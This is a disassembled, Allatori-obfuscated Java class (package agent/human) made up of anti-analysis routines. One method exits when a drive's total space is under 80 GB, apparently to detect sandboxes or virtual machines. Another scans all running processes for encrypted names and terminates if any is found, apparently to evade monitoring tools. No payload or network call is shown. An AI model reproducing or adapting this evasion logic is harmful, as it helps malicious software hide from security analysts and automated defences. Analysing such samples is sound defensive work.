.version 58 0 
.class public super agent/human/m 
.super java/lang/Object 

.method public static c : ()V 
    .code stack 2 locals 0 
L0:     invokestatic InterfaceMethod java/lang/ProcessHandle allProcesses ()Ljava/util/stream/Stream; 
L3:     invokedynamic [id40] 
L8:     invokeinterface InterfaceMethod java/util/stream/Stream forEach (Ljava/util/function/Consumer;)V 2 
L13:    return 
L14:    
        .linenumbertable 
            L0 134 
            L13 66 
        .end linenumbertable 
    .end code 
.end method 

.method public static ALLATORIxDEMO : ()V 
    .code stack 4 locals 0 
L0:     new java/io/File 
L3:     dup 
L4:     ldc 'M' 
L6:     invokestatic Method agent/human/K ALLATORIxDEMO (Ljava/lang/String;)Ljava/lang/String; 
L9:     invokespecial Method java/io/File <init> (Ljava/lang/String;)V 
L12:    invokevirtual Method java/io/File getTotalSpace ()J 
L15:    ldc2_w 85899345920L 
L18:    lcmp 
L19:    ifge L26 
L22:    iconst_m1 
L23:    invokestatic Method java/lang/System exit (I)V 

        .stack same 
L26:    return 
L27:    
        .linenumbertable 
            L0 25 
            L15 45 
            L22 172 
            L26 193 
        .end linenumbertable 
    .end code 
.end method 

.method public <init> : ()V 
    .code stack 1 locals 1 
L0:     aload_0 
L1:     invokespecial Method java/lang/Object <init> ()V 
L4:     return 
L5:     
        .linenumbertable 
            L0 76 
        .end linenumbertable 
        .localvariabletable 
            0 is a Lagent/human/m; from L0 to L5 
        .end localvariabletable 
    .end code 
.end method 

.method public static c : (Ljava/lang/ProcessHandle;)V 
    .code stack 6 locals 4 
L0:     new java/util/ArrayList 
L3:     dup 
L4:     invokespecial Method java/util/ArrayList <init> ()V 
L7:     astore_1 
L8:     aload_0 
L9:     aload_1 
L10:    ldc '\x14`\x16b\ra\x11' 
L12:    invokestatic Method agent/human/K ALLATORIxDEMO (Ljava/lang/String;)Ljava/lang/String; 
L15:    invokevirtual Method java/util/ArrayList add (Ljava/lang/Object;)Z 
L18:    aload_1 
L19:    ldc '\x10F\x11J\x14N' 
L21:    invokestatic Method agent/human/Main ALLATORIxDEMO (Ljava/lang/String;)Ljava/lang/String; 
L24:    invokevirtual Method java/util/ArrayList add (Ljava/lang/Object;)Z 
L27:    aload_1 
L28:    ldc '{\x00b\x1a' 
L30:    invokestatic Method agent/human/K ALLATORIxDEMO (Ljava/lang/String;)Ljava/lang/String; 
L33:    invokevirtual Method java/util/ArrayList add (Ljava/lang/Object;)Z 
L36:    aload_1 
L37:    ldc '\x10B\x14_\x13J\nI\tS' 
L39:    invokestatic Method agent/human/Main ALLATORIxDEMO (Ljava/lang/String;)Ljava/lang/String; 
L42:    invokevirtual Method java/util/ArrayList add (Ljava/lang/Object;)Z 
L45:    pop2 
L46:    pop2 
L47:    invokeinterface InterfaceMethod java/lang/ProcessHandle isAlive ()Z 1 
L52:    ifne L57 
L55:    return 

        .stack full 
            locals 
            stack Object java/lang/Throwable 
        .end stack 
L56:    athrow 

        .stack append Object java/lang/ProcessHandle Object java/util/ArrayList 
L57:    aload_0 
L58:    invokeinterface InterfaceMethod java/lang/ProcessHandle info ()Ljava/lang/ProcessHandle$Info; 1 
L63:    invokeinterface InterfaceMethod java/lang/ProcessHandle$Info command ()Ljava/util/Optional; 1 
L68:    invokevirtual Method java/util/Optional toString ()Ljava/lang/String; 
L71:    astore_2 
L72:    aload_1 
L73:    invokevirtual Method java/util/ArrayList iterator ()Ljava/util/Iterator; 
L76:    astore_1 

        .stack full 
            locals Object java/lang/ProcessHandle Object java/util/Iterator Object java/lang/String 
            stack 
        .end stack 
L77:    aload_1 
L78:    invokeinterface InterfaceMethod java/util/Iterator hasNext ()Z 1 
L83:    ifeq L115 
L86:    aload_1 
L87:    invokeinterface InterfaceMethod java/util/Iterator next ()Ljava/lang/Object; 1 
L92:    checkcast java/lang/String 
L95:    astore_3 
L96:    aload_2 
L97:    invokevirtual Method java/lang/String toLowerCase ()Ljava/lang/String; 
L100:   aload_3 
L101:   invokevirtual Method java/lang/String contains (Ljava/lang/CharSequence;)Z 
L104:   ifeq L77 
L107:   iconst_m1 
L108:   invokestatic Method java/lang/System exit (I)V 
L111:   goto L77 

        .stack full 
            locals 
            stack Object java/lang/Throwable 
        .end stack 
L114:   athrow 

        .stack append Object java/lang/ProcessHandle Object java/util/Iterator Object java/lang/String 
L115:   return 
L116:   
        .linenumbertable 
            L0 195 
            L9 87 
            L18 177 
            L27 5 
            L36 89 
            L47 153 
            L55 163 
            L57 105 
            L72 56 
            L96 138 
            L107 78 
            L111 199 
            L115 92 
        .end linenumbertable 
        .localvariabletable 
            0 is a Ljava/lang/ProcessHandle; from L0 to L116 
        .end localvariabletable 
    .end code 
.end method 

.method private static synthetic ALLATORIxDEMO : (Ljava/lang/ProcessHandle;)V 
    .code stack 1 locals 1 
L0:     aload_0 
L1:     invokestatic Method agent/human/m c (Ljava/lang/ProcessHandle;)V 
L4:     return 
L5:     
        .linenumbertable 
            L0 134 
        .end linenumbertable 
        .localvariabletable 
            0 is a Ljava/lang/ProcessHandle; from L0 to L5 
        .end localvariabletable 
    .end code 
.end method 
.innerclasses 
    java/lang/ProcessHandle$Info java/lang/ProcessHandle Info public static interface abstract 
    java/lang/invoke/MethodHandles$Lookup java/lang/invoke/MethodHandles Lookup public static final 
.end innerclasses 
.sourcefile i 
.const [id40] = InvokeDynamic invokeStatic Method java/lang/invoke/LambdaMetafactory metafactory (Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite; MethodType (Ljava/lang/Object;)V MethodHandle invokeStatic Method agent/human/m ALLATORIxDEMO (Ljava/lang/ProcessHandle;)V MethodType (Ljava/lang/ProcessHandle;)V : accept ()Ljava/util/function/Consumer; 
.end class 
